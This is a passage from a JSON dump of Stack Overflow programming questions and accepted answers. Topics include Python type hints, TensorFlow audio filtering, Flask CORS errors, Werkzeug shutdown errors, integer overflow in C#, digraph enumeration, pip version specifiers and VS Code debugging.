    "AcceptedAnswer": "As of March 2022, the answer is no.\nThis issue has been discussed since at least July 2016. On a proposal to distinguish between str and Iterable[str], Guido van Rossum writes:\n\nSince str is a valid iterable of str this is tricky. Various proposals have been made but they don't fit easily in the type system.\n\nYou'll need to list out all of the types that you want your functions to accept explicitly, using Union (pre-3.10) or | (3.10 and higher).\ne.g. For pre-3.10, use:\nfrom typing import Union\n## Heading ##\ndef operate_on_files(file_paths: Union[TypeOneName, TypeTwoName, etc.]) -> None:\n    for path in file_paths:\n        ...\n\nFor 3.10 and higher, use:\n## Heading ##\ndef operate_on_files(file_paths: TypeOneName | TypeTwoName | etc.) -> None:\n    for path in file_paths:\n        ...\n\nIf you happen to be using Pytype, it will not treat str as an Iterable[str] (as pointed out by Kelly Bundy). But, this behavior is typechecker-specific, and isn't widely supported in other typecheckers.\n"
}
{
    "Id": 71828861,
    "PostTypeId": 1,
    "Title": "Filtering audio signal in TensorFlow",
    "Body": "I am building an audio-based deep learning model. As part of the preporcessing I want to augment the audio in my datasets. One augmentation that I want to do is to apply RIR (room impulse response) function. I am working with Python 3.9.5 and TensorFlow 2.8.\nIn Python the standard way to do it is, if the RIR is given as a finite impulse response (FIR) of n taps, is using SciPy lfilter\nimport numpy as np\nfrom scipy import signal\nimport soundfile as sf\n\nh = np.load(\"rir.npy\")\nx, fs = sf.read(\"audio.wav\")\n\ny = signal.lfilter(h, 1, x)\n\nRunning in loop on all the files may take a long time. Doing it with TensorFlow map utility on TensorFlow datasets:\n# define filter function\ndef h_filt(audio, label):\n    h = np.load(\"rir.npy\")\n    x = audio.numpy()\n    y = signal.lfilter(h, 1, x)\n    return tf.convert_to_tensor(y, dtype=tf.float32), label\n\n# apply it via TF map on dataset\naug_ds = ds.map(h_filt)\n\nUsing tf.numpy_function:\ntf_h_filt = tf.numpy_function(h_filt, [audio, label], [tf.float32, tf.string])\n\n# apply it via TF map on dataset\naug_ds = ds.map(tf_h_filt)\n\nI have two questions:\n\nIs this way correct and fast enough (less than a minute for 50,000 files)?\nIs there a faster way to do it? E.g. replace the SciPy function with a built-in TensforFlow function. I didn't find the equivalent of lfilter or SciPy's convolve.\n\n",
    "AcceptedAnswerId": 71838022,
    "AcceptedAnswer": "Here is one way you could do\nNotice that tensor flow function is designed to receive batches of inputs with multiple channels, and the filter can have multiple input channels and multiple output channels. Let N be the size of the batch I, the number of input channels, F the filter width, L the input width and O  the number of output channels. Using padding='SAME' it maps an input of shape (N, L, I) and a filter of shape (F, I, O) to an output of shape (N, L, O).\nimport numpy as np\nfrom scipy import signal\nimport tensorflow as tf\n\n# data to compare the two approaches\nx = np.random.randn(100)\nh = np.random.randn(11)\n\n# h\ny_lfilt = signal.lfilter(h, 1, x)\n\n# Since the denominator of your filter transfer function is 1\n# the output of lfiler matches the convolution\ny_np = np.convolve(h, x)\nassert np.allclose(y_lfilt, y_np[:len(y_lfilt)])\n\n# now let's do the convolution using tensorflow\ny_tf = tf.nn.conv1d(\n    # x must be padded with half of the size of h\n    # to use padding 'SAME'\n    np.pad(x, len(h) // 2).reshape(1, -1, 1), \n    # the time axis of h must be flipped\n    h[::-1].reshape(-1, 1, 1), # a 1x1 matrix of filters\n    stride=1, \n    padding='SAME', \n    data_format='NWC')\n\nassert np.allclose(y_lfilt, np.squeeze(y_tf)[:len(y_lfilt)])\n\n"
}
{
    "Id": 71818149,
    "PostTypeId": 1,
    "Title": "POST request gets blocked on Python backend. GET request works fine",
    "Body": "I am building a web app where the front-end is done with Flutter while the back-end is with Python.\nGET requests work fine while POST requests get blocked because of CORS, I get this error message:\nAccess to XMLHttpRequest at 'http://127.0.0.1:8080/signal' from origin 'http://localhost:57765' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.\n\nBelow is my flutter function I used to send GET and POST requests:\n  Future sendResponse() async {\n    final url = 'http://127.0.0.1:8080/signal';\n    var data = {\n      \"signal\": '8',\n    };\n    var header = {\n      'Access-Control-Allow-Origin': '*',\n      \"Accept\": \"application/x-www-form-urlencoded, '*'\"\n    };\n\n\n    http.Response response = await http.post(Uri.parse(url), body: data, headers: header);//http.post(Uri.parse(url), body: data, headers: header);//http.get(Uri.parse(url));\n    if (response.statusCode == 200) {\n      print(json.decode(response.body));\n      return jsonDecode(response.body);\n      //print(json.decode(credentials.body));\n    } else {\n      print(response.statusCode);\n      throw Exception('Failed to load Entry');\n    }\n\n   // var ResponseFromPython = await response.body;//jsonDecode(credentials.body);\n\n   // return ResponseFromPython;\n  }\n\nBelow is my Python backend code using Flask:\n   from flask import Flask,jsonify, request, make_response\n   import json\n\n\n   from flask_cors import CORS, cross_origin\n\n\n   #declared an empty variable for reassignment\n   response = ''\n\n   app = Flask(__name__)\n\n   #CORS(app, resources={r\"/signal\": {\"origins\": \"*, http://localhost:59001\"}}) \n   #http://localhost:52857\n   #CORS(app, origins=['*'])\n   app.config['CORS_HEADERS'] = ['Content-Type','Authorization']\n\n\n\n   @app.route(\"/\")\n   def index():\n    \n    return \"Congratulations, it worked\"\n\n   @app.route(\"/signal\", methods = ['POST', 'GET']) #,\n   @cross_origin(origins='http://localhost:57765',headers=['Content-Type','Authorization', \n   'application/x-www-form-urlencoded','*'], upports_credentials=True)# allow all origins all \n   methods.\n   def multbytwo():\n       \"\"\"multiple signal by 2 just to test.\"\"\"\n       global response\n       if (request.method=='POST'):\n       # request.headers.add(\"Access-Control-Allow-Origin\", \"*\")\n           request_data = request.data #getting the response data\n           request_data = json.loads(request_data.decode('utf-8')) #converting it from json to key \n   value pair\n           comingSignal = request_data['signal']\n           response = make_response(comingSignal, 201)#jsonify(comingSignal*2)\n           response.headers.add('Access-Control-Allow-Origin', '*')\n           response.headers.add('Access-Control-Allow-Methods\", \"DELETE, POST, GET, OPTIONS')\n           response.headers.add('Access-Control-Allow-Headers\", \"Content-Type, Authorization, X- \n  Requested-With')\n           return response\n       else:\n           try:\n        #scaler = request.args.get(\"signal\")\n               out = 9 * 2 \n         \n               response = jsonify(out)\n               response.headers.add(\"Access-Control-Allow-Origin\", \"*\") \n               return response #sending data back to your frontend app\n\n           except ValueError:\n               return \"invalid input xyz\"\n\n   if __name__ == \"__main__\":\n       app.run(host=\"127.0.0.1\", port=8080, debug=True)\n\nBelow are the troubleshooting steps I made:\n-Added the flask_CORS package in python\nI tried here different combination from using general parameters like CORS(app, resources={r\"/signal\": {\"origins\": \"*\"}})  did not help. Also tried the decorator @cross-origin and did not help\n-Added some headers to the response itself to indicate that it accepts cross-origin\nYou see in my python code I tried adding a lot of headers to the response, nothing seem to respond.\n-Tried installing an extension in Chrome that by-passes the CORS check\nI tried the allow CORS and CORS unblock extensions and I used the steps described in this answer: How chrome extensions be enabled when flutter web debugging?. Although these extensions are supposed to add the CORS allow header to the response, I still got the same error.\nI still do not fully understand the CORS concept but I tried a lot of work-arounds and nothing works! please help.\n",
    "AcceptedAnswerId": 71882248,
    "AcceptedAnswer": "I finally figured out what was going on.\nFirst I disabled the same origin policy in chrome using this command: this is run clicking the start button in windows and typing this command directly..\nchrome.exe  --disable-site-isolation-trials --disable-web-security --user-data-dir=\"D:\\anything\"\n\nThis fired a separate chrome window that does not block cross-origin, we will call this the CORS free window. This allowed me to finally communicate with my python code and understand what is going on.\n\nYou can see that the chrome default setting were not even showing me anything related to the response, just showing a 500 code error.\nI copied the localhost link and port and pasted them in my other CORS free chrome window\nThe other CORS free chrome window showed helpful information:\n\nIt was a simple JSON decoding error! I went back to my flutter code and I changed the http post request, adding a jsonEncode function on the post body:\nhttp.Response response = await http.post(Uri.parse(url), body:jsonEncode(data), headers: header);\n\nNow the post request returns a correct response on the default chrome settings.\n\nIt was just this CORS blocking the response completely that made me handi-capped.\n"
}
{
    "Id": 72166259,
    "PostTypeId": 1,
    "Title": "Werkzeug server is shutting down in Django application",
    "Body": "after updating the Werkzeug version from 2.0.3 to 2.1.0, I keep getting errors every time I run the server, and here is the error log:\nException happened during processing of request from ('127.0.0.1', 44612)                                                                                                                                  \nTraceback (most recent call last):                                                                                                                                                                         \n  File \"/usr/lib/python3.8/socketserver.py\", line 683, in process_request_thread                                                                                                                           \n    self.finish_request(request, client_address)                                                                                                                                                           \n  File \"/usr/lib/python3.8/socketserver.py\", line 360, in finish_request                                                                                                                                   \n    self.RequestHandlerClass(request, client_address, self)                                                                                                                                                \n  File \"/usr/lib/python3.8/socketserver.py\", line 747, in __init__                                                                                                                                         \n    self.handle()                                                                                                                                                                                          \n  File \"/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/werkzeug/serving.py\", line 363, in handle                                                                                          \n    super().handle()                                                                                                                                                                                       \n  File \"/usr/lib/python3.8/http/server.py\", line 427, in handle                                                                                                                                            \n    self.handle_one_request()                                                                                                                                                                              \n  File \"/usr/lib/python3.8/http/server.py\", line 415, in handle_one_request                                                                                                                                \n    method()                                                                                                                                                                                               \n  File \"/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/werkzeug/serving.py\", line 243, in run_wsgi                                                                                        \n    self.environ = environ = self.make_environ()                                                                                                                                                           \n  File \"/home/oladhari/.virtualenvs/reachat/lib/python3.8/site-packages/django_extensions/management/commands/runserver_plus.py\", line 326, in make_environ                                                \n    del environ['werkzeug.server.shutdown']                                                                                                                                                                \nKeyError: 'werkzeug.server.shutdown'  \n\nthis exception keep appearing while incrementing by 2 ( ('127.0.0.1', 44612) ->  ('127.0.0.1', 44628)  and the server crash\nchecking the changes log, I have found this detail:\nRemove previously deprecated code. #2276\n\nRemove the non-standard shutdown function from the WSGI environ when running the development server. See the docs for alternatives.\n\nhere is the link to the changes log\nit asks to check the documentation for alternatives but can not find any\nplease let me know how I would resolve this error, thank you\nNB: my python version is 3.8\n",
    "AcceptedAnswerId": 72206748,
    "AcceptedAnswer": "Literally just ran into this today. According to their (git repo issue 1715) and assuming you are running runserver_plus, there are three options that worked for some users. The first worked for me:\n\nNot altering your files and adding the option --keep-meta-shutdown. My full command looks like python manage.py runserver_plus --cert-file /path/to/cert.pem --key-file /path/to/key.pem --keep-meta-shutdown localhost:9000\nComment out open lines 325 and 326 under your runserver_plus.py\nUpgrading python to 3.10\n\nHope this helps!\n"
}
{
    "Id": 72782100,
    "PostTypeId": 1,
    "Title": "For loop in c# vs For loop in python",
    "Body": "I was writing a method that would calculate the value of e^x. The way I implemented this in python was as follows.\nimport math\n\ndef exp(x):\n    return sum([\n        x**n/math.factorial(n)\n        for n in range(0, 100)\n    ])\n\nThis would return the value of e^x very well. But when I tried to implement the same method in c#, it didn't output the same value as it did in python. The following was the implementation in c#.\nstatic double exp(int x)\n{\n    double FinalAnswer = 0;\n    for (int j = 0; j <= 100; j++)\n    {\n        FinalAnswer += (Math.Pow(x, j))/Factorial(j);\n    }\n    return FinalAnswer;\n}\n\nThe output for this code was an infinity symbol at first. To resolve this I just reduced the number of times the loop ran. The output of the code in c# where the loop only ran 10 times was pretty close to the output in python where the loop ran 100 times. My question is that what is going on between the two loops in different programming languages. At first I thought that the expression that I was using in my method to calculate e^x was converging quickly. But how does a loop that runs 10 times produce an output that matches the output of a loop that runs 100 times.\nAlso, When I increased the for loop in c# to 20 and 30, the values of e^x for x > 3 were way off. Could someone explain what is going on here?\n",
    "AcceptedAnswerId": 72782395,
    "AcceptedAnswer": "What you're likely running into here is integer overflow with the C# version of the Factorial function (at least your implementation of it, or wherever its coming from).\nIn C#, an int is a numerical type stored in 32 bits of memory, which means it's bounded by -2^31  which is around +/- 2.1 billion. You could try using a long type, which is a 64 bit numerical type, however for even larger upper bounds in your for loop, like getting close to 100, you're going to overflow long as well.\nWhen you run the Factorial function in C#, it starts off normally for the first little while, however if you keep going, you'll see that it all of a sudden jumps into negative numbers, and if you keep going even further than that, it'll get to 0 and stop changing. You're seeing the output of infinity due to division by 0, and C# has a way of handling that with doubles; that being to just return double.PositiveInfinity.\nThe reason why this doesn't happen in python is that it uses a variable number of bits to store its numerical values.\nAdded note: What you might also want to try is using a Factorial function that works with the double type instead of int or long, however by doing this, you'll lose precision on what the exact value is, but you get more range as the magnitude of the number you can store is larger\nFurther Note: As mentioned in the comments, C# has a type called BigInteger which is designed to handle huge numbers like the values you would expect from large inputs to a Factorial function. You can find a reference to the BigInteger docs here\n\nWhat you can do is calculate each component of the factorial function separately with the power you're using. Here's what I mean:\npublic decimal Exp(decimal power, int accuracy = 100)\n{\n    decimal runningTotal = 1;\n    decimal finalValue = 1;\n    for (int i = 1; i <= accuracy; i++)\n    {\n        runningTotal *= power/i;\n        finalValue += runningTotal;\n    }\n    return finalValue;\n}\n\n"
}
{
    "Id": 71671866,
    "PostTypeId": 1,
    "Title": "Python: What is the difference between `lambda` and `lambda_`?",
    "Body": "I know the function of lambda: and lambda var: , but what does lambda_: means acutally?\n",
    "AcceptedAnswerId": 71671890,
    "AcceptedAnswer": "lambda_ is just a variable name, like any other. Like foo or x.\nIf you saw:\nlambda_: Something\n\nThen that is actually a variable annotation, for type hints, so the same as:\nnum: int\nnum = 0\n\n"
}
{
    "Id": 71641609,
    "PostTypeId": 1,
    "Title": "How does CPython implement os.environ?",
    "Body": "I was looking through source and noticed that it references a variable environ in methods before its defined:\ndef _createenviron():\n    if name == 'nt':\n        # Where Env Var Names Must Be UPPERCASE\n        def check_str(value):\n            if not isinstance(value, str):\n                raise TypeError(\"str expected, not %s\" % type(value).__name__)\n            return value\n        encode = check_str\n        decode = str\n        def encodekey(key):\n            return encode(key).upper()\n        data = {}\n        for key, value in environ.items():\n            data[encodekey(key)] = value\n    else:\n        # Where Env Var Names Can Be Mixed Case\n        encoding = sys.getfilesystemencoding()\n        def encode(value):\n            if not isinstance(value, str):\n                raise TypeError(\"str expected, not %s\" % type(value).__name__)\n            return value.encode(encoding, 'surrogateescape')\n        def decode(value):\n            return value.decode(encoding, 'surrogateescape')\n        encodekey = encode\n        data = environ\n    return _Environ(data,\n        encodekey, decode,\n        encode, decode)\n\n# unicode environ\nenviron = _createenviron()\ndel _createenviron\n\nSo how does environ get setup? I cant seem to reason about where its initialized and declared so that _createenviron can use it?\n",
    "AcceptedAnswerId": 71682620,
    "AcceptedAnswer": "TLDR search for from posix import * in os module content.\nThe os module imports all public symbols from posix (Unix) or nt (Windows) low-level module at the beginning of os.py.\nposix exposes environ as a plain Python dict.\nos wraps it with _Environ dict-like object that updates environment variables on _Environ items changing.\n"
}
{
    "Id": 71597789,
    "PostTypeId": 1,
    "Title": "Generate all digraphs of a given size up to isomorphism",
    "Body": "I am trying to generate all directed graphs with a given number of nodes up to graph isomorphism so that I can feed them into another Python program. Here is a naive reference implementation using NetworkX, I would like to speed it up:\nfrom itertools import combinations, product\nimport networkx as nx\n\ndef generate_digraphs(n):\n  graphs_so_far = list()\n  nodes = list(range(n))\n  possible_edges = [(i, j) for i, j in product(nodes, nodes) if i != j]\n  for edge_mask in product([True, False], repeat=len(possible_edges)):\n    edges = [edge for include, edge in zip(edge_mask, possible_edges) if include]\n    g = nx.DiGraph()\n    g.add_nodes_from(nodes)\n    g.add_edges_from(edges)\n    if not any(nx.is_isomorphic(g_before, g) for g_before in graphs_so_far):\n      graphs_so_far.append(g)\n  return graphs_so_far\n\nassert len(generate_digraphs(1)) == 1\nassert len(generate_digraphs(2)) == 3\nassert len(generate_digraphs(3)) == 16\n\nThe number of such graphs seems to grow pretty quickly and is given by this OEIS sequence. I am looking for a solution that is able to generate all graphs up to 7 nodes (about a billion graphs in total) in a reasonable amount of time.\nRepresenting a graph as a NetworkX object is not very important; for example, representing a graph with an adjacency list or using a different library is good with me.\n",
    "AcceptedAnswerId": 71701505,
    "AcceptedAnswer": "There\u2019s a useful idea that I learned from Brendan McKay\u2019s paper\n\u201cIsomorph-free exhaustive generation\u201d (though I believe that it predates\nthat paper).\nThe idea is that we can organize the isomorphism classes into a tree,\nwhere the singleton class with the empty graph is the root, and each\nclass with graphs having n > 0 nodes has a parent class with graphs\nhaving n \u2212 1 nodes. To enumerate the isomorphism classes of graphs with\nn > 0 nodes, enumerate the isomorphism classes of graphs with n \u2212 1\nnodes, and for each such class, extend its representatives in all\npossible ways to n nodes and filter out the ones that aren\u2019t actually\nchildren.\nThe Python code below implements this idea with a rudimentary but\nnontrivial graph isomorphism subroutine. It takes a few minutes for n =\n6 and (estimating here) on the order of a few days for n = 7. For extra\nspeed, port it to C++ and maybe find better algorithms for handling the\npermutation groups (maybe in TAoCP, though most of the graphs have no\nsymmetry, so it\u2019s not clear how big the benefit would be).\nimport cProfile\nimport collections\nimport itertools\nimport random\n\n\n# Returns labels approximating the orbits of graph. Two nodes in the same orbit\n# have the same label, but two nodes in different orbits don't necessarily have\n# different labels.\ndef invariant_labels(graph, n):\n    labels = [1] * n\n    for r in range(2):\n        incoming = [0] * n\n        outgoing = [0] * n\n        for i, j in graph:\n            incoming[j] += labels[i]\n            outgoing[i] += labels[j]\n        for i in range(n):\n            labels[i] = hash((incoming[i], outgoing[i]))\n    return labels\n\n\n# Returns the inverse of perm.\ndef inverse_permutation(perm):\n    n = len(perm)\n    inverse = [None] * n\n    for i in range(n):\n        inverse[perm[i]] = i\n    return inverse\n\n\n# Returns the permutation that sorts by label.\ndef label_sorting_permutation(labels):\n    n = len(labels)\n    return inverse_permutation(sorted(range(n), key=lambda i: labels[i]))\n\n\n# Returns the graph where node i becomes perm[i] .\ndef permuted_graph(perm, graph):\n    perm_graph = [(perm[i], perm[j]) for (i, j) in graph]\n    perm_graph.sort()\n    return perm_graph\n\n\n# Yields each permutation generated by swaps of two consecutive nodes with the\n# same label.\ndef label_stabilizer(labels):\n    n = len(labels)\n    factors = (\n        itertools.permutations(block)\n        for (_, block) in itertools.groupby(range(n), key=lambda i: labels[i])\n    )\n    for subperms in itertools.product(*factors):\n        yield [i for subperm in subperms for i in subperm]\n\n\n# Returns the canonical labeled graph isomorphic to graph.\ndef canonical_graph(graph, n):\n    labels = invariant_labels(graph, n)\n    sorting_perm = label_sorting_permutation(labels)\n    graph = permuted_graph(sorting_perm, graph)\n    labels.sort()\n    return max(\n        (permuted_graph(perm, graph), perm[sorting_perm[n - 1]])\n        for perm in label_stabilizer(labels)\n    )\n\n\n# Returns the list of permutations that stabilize graph.\ndef graph_stabilizer(graph, n):\n    return [\n        perm\n        for perm in label_stabilizer(invariant_labels(graph, n))\n        if permuted_graph(perm, graph) == graph\n    ]\n\n\n# Yields the subsets of range(n) .\ndef power_set(n):\n    for r in range(n + 1):\n        for s in itertools.combinations(range(n), r):\n            yield list(s)\n\n\n# Returns the set where i becomes perm[i] .\ndef permuted_set(perm, s):\n    perm_s = [perm[i] for i in s]\n    perm_s.sort()\n    return perm_s\n\n\n# If s is canonical, returns the list of permutations in group that stabilize s.\n# Otherwise, returns None.\ndef set_stabilizer(s, group):\n    stabilizer = []\n    for perm in group:\n        perm_s = permuted_set(perm, s)\n        if perm_s < s:\n            return None\n        if perm_s == s:\n            stabilizer.append(perm)\n    return stabilizer\n\n\n# Yields one representative of each isomorphism class.\ndef enumerate_graphs(n):\n    assert 0 <= n\n    if 0 == n:\n        yield []\n        return\n    for subgraph in enumerate_graphs(n - 1):\n        sub_stab = graph_stabilizer(subgraph, n - 1)\n        for incoming in power_set(n - 1):\n            in_stab = set_stabilizer(incoming, sub_stab)\n            if not in_stab:\n                continue\n            for outgoing in power_set(n - 1):\n                out_stab = set_stabilizer(outgoing, in_stab)\n                if not out_stab:\n                    continue\n                graph, i_star = canonical_graph(\n                    subgraph\n                    + [(i, n - 1) for i in incoming]\n                    + [(n - 1, j) for j in outgoing],\n                    n,\n                )\n                if i_star == n - 1:\n                    yield graph\n\n\ndef test():\n    print(sum(1 for graph in enumerate_graphs(5)))\n\n\ncProfile.run(\"test()\")\n\n"
}
{
    "Id": 72244046,
    "PostTypeId": 1,
    "Title": "Use >= or ~= for compatibilty across systems?",
    "Body": "My goal is a simple and proper way to export my venv. In the optimal case, the resulting requirements.txt works on all compatible systems.\nAt the moment I use pip freeze > requirements.txt.\nThis uses the == \"Version matching clause\". On an other system the file might not work due to conflicting versions, although it was compatible.\nIn PEP 440 there is also a ~= \"Compatible clause\".  However, I cannot find an option for that in pip freeze docs. Using \"find and replace\" or a tool like awk to replace == with ~= works okay.\nMy naive conclusion is that ~= would be the ideal clause to use in requirements.txt. However, when I look at popular packages they often use >= to specify a version. E.g. at urllib3.\nIs there a drawback to ~=, which I do not see?\nIf that is not the case:\nWhy is >= used in so many packages?\nEdit:\nPigar has an option to use >= natively and there is a comparison to freeze here. Apparently, they also do not use ~=.\nYet, I am still not sure which one to use, as >= could break when there is a major version change. Also packages which are a lower minor version would be marked incompatible, although they should be compatible.\n",
    "AcceptedAnswerId": 72790287,
    "AcceptedAnswer": "Your question is not simple to answer and touches on some nuances in the social dynamics around versioning.\nEasy stuff first: sometimes versions use a terminal suffix to indicate something like prerelease builds, and if you're dependent on a prerelease build or some other situation where you expect the terminal suffix to iterate repeatedly (especially in a non-ordered way), ~= helps you by letting you accept all iterations on a build. PEP 440 contains a good example:\n~= 2.2.post3\n>= 2.2.post3, == 2.*\n\nSecond, pip freeze is not meant to be used to generate a requirements list. It just dumps a list of everything you've currently got, which is far more than actually needs to go in a requirements file. So it makes sense that it would only use ==: for example, it's meant to let you replicate a set of packages to an 'identical' environment elsewhere.\n\nHard stuff next. Under semantic versioning, the only backwards-incompatible revisions should be major revisions. (This depends on how much you trust the maintainer - put a pin in that.) However, if specifying a patch number, ~= won't upgrade to a new minor rev even if one is available and it should, in principle, be backwards-compatible. This is important to talk about clearly, because \"compatible release\" has two different meanings: in semantic versioning, a \"compatible release\" is (colloquially) any rev between this one and the next major rev; in requirements files, a \"compatible release\" is a revision that patches the same terminal rev only.\nLet me be clear now: when I say \"backwards-compatible,\" I mean it in the semantic versioning sense only. (If the package in question doesn\u2019t use semantic versioning, or has a fourth version number, well - generally ~= will still match all patches, but check to be sure.)\nSo, there's a trade to be made between >= and ~=, and it has to do with chains of trust in dependency management. Here are three principles - then after, I'll offer some speculation on why so many package maintainers use >=.\n\nIn general, it's the responsibility of a package maintainer to ensure that all version numbers matching their requirements.txt are compatible with that package, with the occasional exception of deprecated patch revs. This includes ensuring that the requirements.txt is as small as possible and contains only that package's requirements. (More broadly, \u201crequire as little as possible and validate it as much as possible.\u201d)\n\nIn general, no matter the language and no matter the package, dependencies reflect a chain of trust. I am implementing a package; I trust you to maintain your package (and its requirements file) in a way that continues to function. You are trusting your dependencies to maintain their packages in a way that continues to function. In turn, your downstream consumers are expecting you to maintain your package in a way that means it continues to function for them. This is based on human trust. The number is 'just' a convenient communication tool.\n\nIn general, no matter the change set, package maintainers try extremely hard to avoid major versions. No one wants to be the guy who releases a major rev and forces consumers to version their package through a substantial rewrite - or consign their projects to an old and unsupported version. We accept major revs as necessary (that's why we have systems to track them), but folks are typically loath to use them until they really don't have another option.\n\n\nSynthesize these three. From the perspective of a package maintainer, supposing one trusts the maintainers one is dependent upon (as one should), it is broadly speaking more reasonable to expect major revisions to be rare, than it is to expect minor revisions to be backwards-incompatible by accident. This means the number of reactive updates you'll need to make in the >= scheme should be small (but, of course, nonzero).\n\nThat's a lot of groundwork. I know this is long, but this is the good part: the trade.\nFor example, suppose I developed a package, helloworld == 0.7.10. You developed a package atop helloworld == 0.7.10, and then I later rev helloworld to 0.8. Let's start by considering the best case situation: that I am still offering support for the 0.7.10 version and (ex.) patch it to 0.7.11 at a later date, even while maintaining 0.8 separately. This allows your downstream consumers to accept patches without losing compatibility with your package, even when using ~=. And, you are \"guaranteed\" that future patches won't break your current implementation or require maintenance in event of mistakes - I\u2019m doing that work for you. Of course, this only works if I go to the trouble of maintaining both 0.7 and 0.8, but this does seem advantageous...\nSo, why does it break? Well, one example. What happens if you specify helloworld ~= 0.7.10 in your package, but another upstream dependency of yours (that isn't me!) upgrades, and now uses helloworld >= 0.8.1? Since you relied on a minor version's compatibility requirements, there's now a conflict. Worse, what if a consumer of your package wants to use new features from helloworld == 0.8.1 that aren't available in 0.7? They can't.\nBut remember, a semver-compliant package built on helloworld v0.7 should be just fine running on helloworld v0.8 - there should be no breaking changes. It's your specification of ~= that is the most likely to have broken a dependency or consumer need for no good reason - not helloworld.\nIf instead you had used helloworld >= 0.7.10, then you would've allowed for the installation of 0.8, even when your package was not explicitly written using it. If 0.8 doesn't break your implementation, which is supposed to be true, then allowing its use would be the correct manual decision anyway. You don't even necessarily need to know what I'm doing or how I'm writing 0.8, because minor versions should only be adding functionality - functionality you're obviously not using, but someone else might want to.\nThe chain of trust is leaky, though. As the maintainer of helloworld, I might not know for certain whether my revision 0.8 introduces bugs or potential issues that could interfere with the usage of a package originally written for 0.7. Sure, by naming it 0.8 and not 1.0, I claim that I will (and should be expected to!) provide patches to helloworld as needed to address failures to maintain backwards-compatibility. But in practice, that might become untenable, or simply not happen, especially in the very unusual case (joke) where a package does not have rigorous unit and regression tests.\nSo your trade, as a package developer and maintainer, boils down to this: Do you trust me, the maintainer of helloworld, to infrequently release major revs, and to ensure that minor revs do not risk breaking backwards-compatibility, more than you need your downstream consumers to be guaranteed a stable release?\n\nUsing >= means:\n\n(Rare): If I release a major rev, you'll need to update your requirements file to specify which major rev you are referring to.\n(Uncommon): If I release a minor rev, but a bug, review, regression failure, etc. cause that minor rev to break packages built atop old versions, you'll either need to update your requirements file to specify which minor rev you are referring to, or wait for me to patch it further. (What if I decline to patch it further, or worse, take my sweet time doing so?)\n\nUsing ~= means:\n\nIf any of your upstream packages end up using a different minor revision than the one your package was originally built to use, you risk a dependency conflict between you and your upstream providers.\nIf any of your downstream consumers want or need to use features introduced in a later minor revision of a package you depend upon, they can't - not without overriding your requirements file and hoping for the best.\nIf I stop supporting a minor revision of a package you use, and release critical patches on a future minor rev only, you and your consumers won't get them. (What if these are important, ex. security updates? urllib3 could be a great example.)\n\nIf those 'rare' or 'uncommon' events are so disruptive to your project that you just can't conceive of a world in which you'd want to take that risk, use ~=, even at the cost of convenience/security to your downstream consumers. But if you want to give downstream consumers the most flexibility possible, don't mind dealing with the occasional breaking-change event, and want to make sure your own code typically runs on the most recent version it can, using >= is the safer way to go. It's usually the right decision, anyway.\nFor this reason, I expect most maintainers deliberately use >= most of the time. Or maybe it's force of habit. Or maybe I'm just reading too much into it.\n"
}
{
    "Id": 71811731,
    "PostTypeId": 1,
    "Title": "How do you get VS Code to write Debug stdout to the Debug Console?",
    "Body": "I am trying to debug my Python Pytest tests in VS Code, using the Testing Activity on the left bar. I am able to run my tests as expected, with some passing and some failing. I would like to debug the failing tests to more accurately determine what is causing the failures.\nWhen I run an individual test in debug mode VS Code is properly hitting a breakpoint and stopping, and the Run and Debug pane shows the local variables. I can observe the status of local variables either in the Variables > Local pane or through the REPL, by typing the name of the variable.\nWhen I try to print out any statement, such as using > print(\"here\") I do not get any output to the Debug Console. When I reference a variable, or put the string directly using > \"here\" I do see the output to the Debug Console.\nIt seems to me that the stdout of my REPL is not displaying to the Debug Console. A number of answers online have been suggesting to add options like \"redirectOutput\": true or \"console\": \"integratedTerminal\", but neither of those seem to have worked. My full launch.json is below:\n{\n    // Use IntelliSense to learn about possible attributes.\n    // Hover to view descriptions of existing attributes.\n    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Python: Current File\",\n            \"type\": \"python\",\n            \"request\": \"launch\",\n            \"program\": \"${file}\",\n            \"debugOptions\": [\n                \"WaitOnAbnormalExit\",\n                \"WaitOnNormalExit\"\n            ],\n            \"console\": \"integratedTerminal\",\n            \"stopOnEntry\": false,\n            \"redirectOutput\": true,\n            \"outputCapture\": \"std\"\n        }\n    ]\n}\n\nIs there another setting I'm missing to enable this output? Have I got the wrong console type?\n",
    "AcceptedAnswerId": 71888908,
    "AcceptedAnswer": "So After a lot of frustrating \"debugging\" I found a solution that worked for me (if you are using pytest as me):\ntldr\nTwo solutions:\n\ndowngrade your vscode python extension to v2022.2.1924087327 that will do the trick (or any version that had the debugpy).\n\n\nOr, Launch the debbuger from the debug tab not the testing tab. And use a configuration like the following one\n{\n    \"name\": \"Python: Current File (Integrated Terminal)\",\n    \"type\": \"python\",\n    \"request\": \"launch\",\n    \"program\": \"${file}\",\n    \"console\": \"integratedTerminal\",\n    \"purpose\": [\"debug-test\"], \n    \"redirectOutput\": true,\n    \"env\": {\"PYTHONPATH\": \"${workspaceRoot}\"}\n}\n\n\nBonus. If you are using pytest you can temporarily disable the capture of the stdout of pytest  so your print statements, and the print function, *if you breakpoint inside the contextmanager, will work too. This is very cumbersome but points out the original problem of why the prints are not longer working.\ndef test_disabling_capturing(capsys):\n    print('this output is captured')\n    with capsys.disabled():\n        print('output not captured, going directly to sys.stdout')\n    print('this output is also captured')\n\n\n\nthe long explanation\nso the problem apparently is that the debugpy (which is the library used by vscode python debugger) in is last version v1.6.0 fixed this \"bug (827)\". In a nutshell, this \"bug\" was that vscode \"duplicated\" all the stdout when debugging because it captures the pytest stdout and replicate it in the debugger console.\nThis is because, by default, pytest captures all the stdout and store it (so when running all test in parallel it doesn't create a mess).\nAfter \"fixing\" this issue, now, when you launch the test via the testing tab, by default, pytest is capturing all the stdout and the \"new\" (>=v1.6.1) debugpy ignores it. Therefore, all the print statements are not shown anymore on the debug console, even when you call print() in a breakpoint, because are captured by pytest (IDK where the pytest captured stdout is showing/stored if it is anywhere). which, in my case is a PITA.\nYou can disable the pytest capture option using the flag -s or --capture=no when launching pytest in a console or even from the debug tab as a custom configuration. but the problem is that there is no way (apparently) to add these parameters in vscode for the testing tab so pytest is executed using that option.\nTherefore the solution that I found was to downgrade the python extension to a version that uses an older version of debugpy v1.5.1, you can see in the python extension changelog that from the  version 2022.4.0 they update the debugpy version, so going before that did the trick for me, you will have the double stdout \"bug\" in the console, but the print statement will 